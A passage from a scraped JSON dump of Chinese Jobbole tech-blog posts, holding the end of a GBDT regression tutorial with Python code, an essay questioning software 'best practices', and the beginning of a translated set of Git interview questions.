class=\"crayon-line\" id=\"crayon-5bab6705435a4978052449-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">print</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"Tesing the accuracy of GBDT regressor...\"</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6705435a4978052449-4\"> </div><div class=\"crayon-line\" id=\"crayon-5bab6705435a4978052449-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">X</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">y</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">load_boston_house_prices</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6705435a4978052449-6\"> </div><div class=\"crayon-line\" id=\"crayon-5bab6705435a4978052449-7\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">X_train</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">X_test</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">y_train</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">y_test</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">train_test_split</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6705435a4978052449-8\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">X</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">y</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">random_state</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">10</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab6705435a4978052449-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6705435a4978052449-10\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">reg</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">GradientBoostingRegressor</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab6705435a4978052449-11\"><span class=\"crayon-h\">    </span><span class=\"crayon-v\">reg</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">fit</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">X</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">X_train</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">y</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">y_train</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n_estimators</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">4</span><span class=\"crayon-sy\">,</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6705435a4978052449-12\"><span class=\"crayon-h\">            </span><span class=\"crayon-v\">lr</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">0.5</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">max_depth</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">min_samples_split</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">2</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5bab6705435a4978052449-13\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6705435a4978052449-14\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">get_r2</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">reg</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">X_test</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">y_test</span><span class=\"crayon-sy\">)</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0023 seconds] -->\r\n\n</div>\n<h2>3.2 效果展示</h2>\n<p>最终拟合优度0.851，运行时间2.2秒，效果还算不错~</p>\n<figure><img src=\"http://jbcdn2.b0.upaiyun.com/2018/09/4f3602e4dd68fc98498fd7573cf47f7b.jpg\" width=\"440\"></figure>\n<h2>3.3 工具函数</h2>\n<p>本人自定义了一些工具函数，可以在github上查看</p>\n<blockquote><p><a href=\"https://link.zhihu.com/?target=https%3A//github.com/tushushu/imylu/blob/master/imylu/utils.py\" target=\"_blank\">utils.pygithub.com</a></p></blockquote>\n<p>1. run_time – 测试函数运行时间</p>\n<p>2. load_boston_house_prices – 加载波士顿房价数据</p>\n<p>3. train_test_split – 拆分训练集、测试集</p>\n<p>4. get_r2 – 计算拟合优度</p>\n<h1>总结</h1>\n<p>GBDT回归的原理：平均值加回归树</p>\n<p>GBDT回归的实现：加加减减for循环</p>\n<p>【关于作者】</p>\n<p>李小文：先后从事过数据分析、数据挖掘工作，主要开发语言是Python，现任一家小型互联网公司的算法工程师。Github: <a href=\"https://github.com/tushushu\" target=\"_blank\" rel=\"noopener\">https://github.com/tushushu</a></p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114351\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114351votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114351\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/jobbole\">伯乐在线读者</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/jobbole\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2015/04/8fbdaaa5ea6d3b49c8c1c825aafeb5d9.png\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            ① 本账号用于发布那些在伯乐在线无账号的读者的投稿，包括译文和原创文章。② 欢迎加入伯乐在线专栏作者：http://blog.jobbole.com/99322/        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/jobbole\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/jobbole/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/jobbole/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 34</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/ecce700fc49a6c9d59f6f5aac1822d3a8c7a69b3.jpg"}
{"title": "彼之蜜糖，吾之砒霜 —— 聊聊软件开发中的最佳实践", "url": "http://blog.jobbole.com/114361/", "create_date": "2018/09/09", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/08/aac3e1c638967b5812c7816b91669d20.jpg"], "url_object_id": "dc39d3e3075b14fc0c095af126128d6d", "praise_nums": 1, "fav_nums": 2, "comment_nums": 1, "tags": "IT技术,实践", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://www.cnblogs.com/sherrywasp/p/9436623.html\">sherrywasp</a>   </div><div id=\"cnblogs_post_body\">\n<p> <img src=\"http://jbcdn2.b0.upaiyun.com/2018/09/ac6c4eb408f3b5aadc0c97490a6a5bb0.jpg\" alt=\"\"></p>\n<p>“描述一个事物，唯有一个名词定义它的概念，唯有一个动词揭露它的行为，唯有一个形容词表现它的特征。要做的，就是用心去寻找那个名词、那个动词、那个形容词……”</p>\n<p>—— 福楼拜 (Gustave Flaubert)</p>\n<p>我想讲个故事。</p>\n<p>很久很久以前（一般讲故事都是这样开头吧）， 两个老工程师在一起聊天，谈各自生涯中最自豪的工程。其中一个先讲述了他的杰作：</p>\n<p>“ 我们建造的桥，横跨一个峡谷，峡谷很宽很深。我们花了两年时间研究地质，选择材料。聘请了最好的工程师团队来设计方案，而这又花了五年时间。 我们签下了最大的工程队，委托他们建造基础结构、塔墩、收费亭，以及用于连接桥梁和高速公路的道路。桥面下层是铁路，我们甚至还修了自行车道。 那座桥花费了我数年的心血。”</p>\n<p>另外一个听完之后，陷入了沉思，过了一会儿，说到：</p>\n<p>“ 有一天晚上，我和一个朋友喝了点伏特加，然后我俩扔了一根绳子，越过一个河谷。呃…… 就是一根绳子，两头系在两颗树上。 河谷两边各有一个村庄，起初，有人加了个滑轮，用来传递包裹。然后，有人拉起了第二根绳子，勉强可以走走，虽然很危险，但小伙子们很喜欢。 后来，一群人重新修建了一下，使得更牢固。于是，女人们也开始从上面走，每天带着她们的农产品过桥。 就这样，在桥的另一边形成了一个市场。因为地方开阔，造了很多房子，慢慢地发展成了一个镇子。 绳索桥被木桥替代，这样就可以走马车了。 后来，镇上的人们修了一座真正的石桥。再然后，人们又把石料改成了钢材。 如今，那座钢构悬索桥依然伫立在那里。”</p>\n<p>前一个工程师沉默良久，说到：“ 有意思。我那座桥建成大约十年后，被拆除了。事实证明我们选错了地点，建好的桥没人用。据说有几个野路子的家伙，在下游几英里处，拉了一根绳子，所有人都从那走。”</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/09/f5322a1403f8c44ee9b3f966e2735857.jpg\" alt=\"\"></p>\n<p style=\"text-align: center\">金门大桥（旧金山）</p>\n<p>我很喜欢这个故事。故事的出处，在一款消息队列产品—— ZeroMQ 的<a href=\"http://zguide.zeromq.org/page:all#header-167\" target=\"_blank\">官方指南第6章</a>里。</p>\n<p>说完故事，我想聊聊软件开发中，常常可以听到的一个概念 —— <strong>Best Practice</strong> ：<strong>最佳实践</strong>。Wikipedia 上对其解释为：</p>\n<p><em>A best practice is a method or technique that has been generally accepted as superior to any alternatives because it produces results that are superior to those achieved by other means or because it has become a standard way of doing things.</em></p>\n<p>(最佳实践是一种：因其产生的结果优于其它选择下的结果，或其已经成为一种做事的标准，从而被普遍认可优于任何替代方案的方法或技术。)</p>\n<p>这个概念源于管理学，然后在 IT 界泛滥。简而言之，就是所谓“正确的做法”。</p>\n<p>最佳实践本身是美好的存在，犹如夜空中的一轮明月，照亮黑暗中的方向，指引着摸索前行的凡人。</p>\n<p>但凡事有度，子曰：“过犹不及。”</p>\n<p>我今天想说的，就是这<strong>月亮的背面</strong>。（传说中，月球背面隐藏着…… 嘘~）</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/09/0a06d21f159eb9efbafc53eba808fd2d.jpg\" alt=\"\"></p>\n<p>潮汐锁定导致月球永远以同一面朝向地球</p>\n<p>首先，<strong>最佳实践容易带来思想包袱，让人无法专注于解决问题本身。</strong></p>\n<p>总是希望采用最好的技术方法，不愿意在不正确的做法上浪费时间，导致瞻前顾后，甚至裹足不前。此时的最佳实践，已然成为了一种毒药，一旦偏离了问题本身这个出发点，就会不知不觉走进“宏大构想”的思维陷阱。把简单的问题复杂化，阻碍了迈出第一步，直到能规划出“包罗万象”的解决方案后才肯动手，拖延症就这样来了，时间却走了。</p>\n<p>你想好了未来每一天怎么过吗…… 没想好？ 那……不活了？</p>\n<p>其次，<strong>对最佳实践的执念容易让人钻牛角尖，将目标的重心带偏。</strong></p>\n<p>过度关注实施过程是否符合标准化，忽视了项目中其它重要的东西，比如用户体验，比如实际需求。就像故事里讲的那样：第一座大桥，几乎是教科书般的标准化路数，可产品落地后和客户需求却差了好几英里；第二个看上去很野路子，但精准地解决了痛点，从始自终都是紧紧围绕实际需求迭代，每一次的进步都可以产生效用，这才叫杀手级应用。</p>\n<p>这让我想起了 <strong>Plan-9</strong> 的传说。</p>\n<p>你听说过 Plan-9 OS 吗？ 一款由贝尔实验室的极客们打造的用于完善 UNIX 不足的操作系统。什么不足？在 UNIX 的哲学中，有一条叫做 “一切皆文件” ，但实际上UNIX本身并没有严格遵从这一条。于是，Plan-9 OS 完美实现了这一点。然后呢……？ 没有然后了。它从没进过市场，所以如果你没听说过它，一点也不奇怪。Plan-9 OS 没有解决任何现实问题，没人在乎 “一切皆不皆文件”。</p>\n<p>这种执念的另一种表现就是<strong>工程师思维，沉迷于奇技淫巧中无法自拔，</strong>程序员尤其容易中招。</p>\n<p>比如性能优化。“优秀的程序员应该榨干每一字节内存”，听起来很熟悉，不是吗？但经济学上来讲，边际效应决定了一次项目中，越优化性价比越低。有一个很容易被忽略的事实：<strong>硬件其实比程序员要便宜</strong>。</p>\n<p>再比如对设计模式的崇拜。设计模式当然是好东西，但如果像强迫症一样使用它们，坚持用上它们才是正确的编程，就会导致按图索骥，强行让问题去适应设计模式，而不是让解决方案针对问题，这就本末倒置了。</p>\n<p>我有个基友，C++ 极客。毕业后入了腾讯，积累了巨额财富后，自己创业了。当然，当老板可比写 C++ 难多了，于是现在又去积累巨额财富了。想当年和那厮聊天，言必出设计模式，没事侃正则，再没事就研究 GC 策略 (好像玩 C++ 的普遍这德性) 。前不久看他代码，差点没认出来，这家伙画风一转，现在连接口都懒得多用（估计看到这，某些狂热分子肯定在破口大骂：你什么意思，你说你没用面向接口编程？）那位兄台甚至都懒得多聊，轻描淡写来一句，“没心思，以后有需要再加。”</p>\n<p>顺便扯一句，那哥们最近负责开发一款手游，他跟老板汇报的时候，预估的研发周期要12个月，然后老板跟他说：“好，12月出公测。” (哈~ 估计他肯定舌头打结把“12个月”说成了“12月”)。看到这的你，是否回忆起了你的老板？</p>\n<p>这也是我接下来想说的关于最佳实践的另一个问题：<strong>项目实施。</strong></p>\n<p>工作数年，大小项目经历若干，慢慢体会到，一个项目的开发顺利与否，并不在于技术选型是否为最佳实践，更多的时候，取决于开发方案和技术储备之间的平衡。<strong>做项目毕竟是要讲方案落地的</strong>，如果最佳实践中的技术成本，超出了开发者的落实能力，那就是坑，这时盲从最佳实践无异于挖坟。如果是一个人的项目，抽时间恶补一通，兴许能填填坑，这取决于IQ。但要是一个团队，那就不是什么 IQ，EQ，QQ 的问题了，这中间产生的学习成本，集体培训成本，反复沟通成本，大量的初级错误，千奇百怪的代码，互相冲突引发的焦躁情绪，等等。这些负面的东西如果不能妥善的处理，足以抵消掉最佳实践带来的好处。别忘了，deadline 正在迫近。</p>\n<p>我自己曾经在一个项目组里，强行推行 <strong>Git</strong> 做源代码管理，当时组里共9人，有7人只会 SVN，但我坚持 Git 是 “最佳实践”。要不说年少无知少不更事呢，罢了，后来的事情我不想回忆了…… 那次项目之后，我再也不在一群只会 SVN 的队伍里提 Git 了。</p>\n<p><strong>一个人做软件已经很难，比这更难的，是一群人做软件。</strong></p>\n<p>当尘埃落定，蓦然回首，最佳实践很可能<strong>没你想象中那么重要</strong>。它更多的是一种精神层面的求道，并非物质世界的必要。</p>\n<p>扎克伯格 ( Mark Zuckerberg ) 于2004年在哈佛柯克兰公寓 ( Kirkland House ) 里写出 <strong>TheFacebook</strong> 的时候 ( 次年更名为Facebook ) ，用的是 “世界上最好的编程语言” PHP。这门可能是业界被吐槽次数最多的语言一直支撑着FB帝国的诞生，直到席卷全球。<strong>Stack Overflow</strong> 的联合创始人 Jeff Atwood 曾公开揶揄 Facebook 是一家 “召集全球顶级程序员在 Windows XP 上写 PHP ” 的公司。但这无所谓，24年前的马克也不纠结。一直等到需要的时候 (2010年)，Facebook自己动手研发了一个编程语言 —— Hack，来解决 PHP 带来的危机。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/09/ed53b98d1cb369ab305dcb69e00fbe53.jpg\" alt=\"\"></p>\n<p style=\"text-align: center\">《社交网络》</p>\n<p>最佳实践，关键在时机（Timing）。</p>\n<p>如果说用 Facebook 这个 “根本不存在” 的网站来举例，纯属虚构的话，那我们来说点真实的例子，Web 技术的基石——<strong>HTML</strong>。由20世纪最重要的100人之一的 <strong>Tim Berners-Lee</strong> 创造的 HTML，其发明之伟大，足以单独开篇博文来赞美了，这里就不赘述了。</p>\n<p>这样一个造福全人类的神作，本身的设计结构绝非完美，甚至可以用混乱不堪来形容。没有严格统一的约束，形同虚设的规范，标准化进程的难产。以至于在很长一段时间内，连自身元素的定义，都可以向浏览器厂商妥协。但是，种种被人诟病的存在，丝毫不影响 HTML 改变世界的脚步。你我今天能相会于园，皆仰赖它的诞生。</p>\n<p>同样的例子还发生在 Web 世界另一个巨擎上——<strong>JavaScript</strong>。当今世界，Web 前端技术已经水银泻地般肆虐整个开发界，前端框架百花齐放、JS 衍生品鳞次栉比。所有这一切的背后，全都源于上世纪90年代横空出世的 JavaScript。</p>\n<p>那么，JavaScript是最佳实践吗？</p>\n<p>别逗了，如果有什么语言可以和刚才说到的 PHP 竞争一下谁被骂的次数更多，那非 JavaScript 莫属。这个仅花了十天设计出来的语言，打一出身就被贴上了怪胎的标签。混乱的标准，多样的实现，安全漏洞，语法随意，反人类…… 总之，JavaScript 和最佳实践半毛钱关系都扯不上，但它却是撑起当今互联网半壁江山的擎天柱。</p>\n<p>所以，用最接地气地话来说，不管黑猫白猫，逮着耗子就是最佳实践猫。</p>\n<p><strong>彼之蜜糖，吾之砒霜。</strong>所谓最佳实践，其定义本身往往也是分歧的源头。什么是最佳？这个最佳是独一无二的吗？世界上有很多很多现实问题，可能根本就没有所谓的最佳实践。</p>\n<p>请听题，世界上最好的编程语言是哪个？</p>\n<p>第二题，世界上最好的文本编辑器是哪个？</p>\n<p>朋友，这天还聊得下去吗……</p>\n<p>最后，说一个我自己的故事。</p>\n<p>很久很久以前，为了找一款满意的文本编辑器，我干了一件可能是前无古人，后不知道有没有来者的蠢事 —— 我打开 Wikipedia，搜索 “ text editor ” ，然后转到一个叫做 “ List of text editors ” 的页面，接下来的一个月，我几乎把当时那个页面上，所有我能下载安装的文本编辑器，全部试用了一遍……</p>\n<p>嗯？你问我为什么这么做？呵呵，不把全世界的文本编辑器遍历一遍，我怎么知道哪个是最好的？</p>\n<p>这事细节我不想再提了，我也不想回忆了。要不说年少无知少不更事呢，时至今日，我想不出比这更愚蠢的事了。WTF~~</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/09/92c09b44bc648c3b042a9922c6cdd156.png\" alt=\"\"></p>\n<p>这个页面上的表格行数逐年增多</p>\n<p>如今，再有人问我最好的编程语言或者最好的文本编辑器的问题的话，我会说：</p>\n<p>“朋友，要打架吗？”</p>\n<p>这两个问题的最佳实践，唯有暴力。</p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114361\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114361votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114361\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/22aa7c4120eab2754c226f2916d800342e6adfb3.jpg"}
{"title": "泪流满面的 11 个 Git 面试题", "url": "http://blog.jobbole.com/114297/", "create_date": "2018/08/22", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/02/2027c50856ddfe647e45b4ac2e86c9f1.jpg"], "url_object_id": "cc287256cb2f4fb68b9f245e7415ca58", "praise_nums": 1, "fav_nums": 2, "comment_nums": 0, "tags": "IT技术,Git", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/hearingdog\">BEASTQ</a> 翻译，<a href=\"http://www.jobbole.com/members/hanxiaomax\">艾凌风</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://dev.to/aershov24/11-painful-git-interview-questions-you-will-cry-on-1n2g\">Alex Ershov</a>。欢迎加入<a target=\"_blank\" href=\"https://github.com/jobbole/translation-project\">翻译组</a>。</div><p>在今年的 Stack Overflow 开发者调查报告中，超过 70% 的开发者使用 Git，使其成为世界上使用人数最多的版本控制系统。Git 通常用于开源和商业软件开发，对个人、团队和企业都颇有益处。</p>\n<h3>Q1: 什么是 Git 复刻（fork）？复刻（fork）、分支（branch）和克隆（clone）之间有什么区别？</h3>\n<blockquote><p>主题：<strong>Git</strong> 难度：⭐⭐</p></blockquote>\n<ul>\n<li><strong>复刻（fork）</strong> 是对存储仓库（repository）进行的远程的、服务器端的拷贝，从源头上就有所区别。复刻实际上不是 Git 的范畴。它更像是个政治/社会概念。</li>\n<li><strong>克隆（clone）</strong> 不是复刻，克隆是个对某个远程仓库的本地拷贝。克隆时，实际上是拷贝整个源存储仓库，包括所有历史记录和分支。</li>\n<li><strong>分支（branch）</strong> 是一种机制，用于处理单一存储仓库中的变更，并最终目的是用于与其他部分代码合并。</li>\n</ul>\n<p>🔗<strong>来源：</strong> <a href=\"https://stackoverflow.com/questions/3329943/git-branch-fork-fetch-merge-rebase-and-clone-what-are-the-differences/\">stackoverflow.com</a></p>\n<p> </p>\n<h3>Q2: “拉取请求（pull request）”和“分支（branch）”之间有什么区别？</h3>\n<blockquote><p>主题：<strong>Git</strong> 难度：⭐⭐</p></blockquote>\n<ul>\n<li><strong>分支（branch）</strong> 是代码的一个独立版本。</li>\n<li><strong>拉取请求（pull request）</strong> 是当有人用仓库，建立了自己的分支，做了些修改并合并到该分支（把自己修改应用到别人的代码仓库）。</li>\n</ul>\n<p>🔗<strong>来源：</strong> <a href=\"https://stackoverflow.com/questions/19059838/whats-the-difference-between-a-pull-request-and-a-branch\">stackoverflow.com</a></p>\n<p> </p>\n<h3>Q3: “git pull”和“git fetch”之间有什么区别？</h3>\n<blockquote><p>主题：<strong>Git</strong> 难度：⭐⭐</p></blockquote>\n<p>简单来说，<code>git pull</code> 是 <code>git fetch</code> + <code>git merge</code>。</p>\n<ul>\n<li>当你使用 <code>pull</code>，Git 会试着自动为你完成工作。<strong>它是上下文（工作环境）敏感的</strong>，所以 Git 会把所有拉取的提交合并到你当前处理的分支中。<code>pull</code> 则是 <strong>自动合并提交而没有让你复查的过程</strong>。如果你没有细心管理你的分支，你可能会频繁遇到冲突。</li>\n<li>当你 <code>fetch</code>，Git 会收集目标分支中的所有不存在的提交，并<strong>将这些提交存储到本地仓库中</strong>。但<strong>Git 不会把这些提交合并到当前分支中</strong>。这种处理逻辑在当你需要保持仓库更新，在更新文件时又希望处理可能中断的事情时，这将非常实用。而将提交合并到主分支中，则该使用 <code>merge</code>。</li>\n</ul>\n<p>🔗<strong>来源：</strong> <a href=\"https://stackoverflow.com/questions/292357/what-is-the-difference-between-git-pull-and-git-fetch\">stackoverflow.com</a></p>\n<p> </p>\n<h3>Q4: 如在 Git 恢复先前的提交？</h3>\n<blockquote><p>主题：<strong>Git</strong> 难度：⭐⭐⭐</p></blockquote>\n<p>假设你的情形是这样，其中 C 是你的 HEAD，(F) 是你文件的状态。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670e1a740817358901\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n   (F)\r\nA-B-C\r\n    ↑\r\n  master</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab670e1a740817358901-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670e1a740817358901-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab670e1a740817358901-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab670e1a740817358901-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab670e1a740817358901-1\"><span class=\"crayon-h\">   </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">F</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670e1a740817358901-2\"><span class=\"crayon-v\">A</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">B</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">C</span></div><div class=\"crayon-line\" id=\"crayon-5bab670e1a740817358901-3\"><span class=\"crayon-h\">    </span>↑</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab670e1a740817358901-4\"><span class=\"crayon-h\">  </span><span class=\"crayon-v\">master</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p></p>\n<ul>\n<li>要修改提交中的更改：</li>\n</ul>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab670e1cdf6841693866\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div 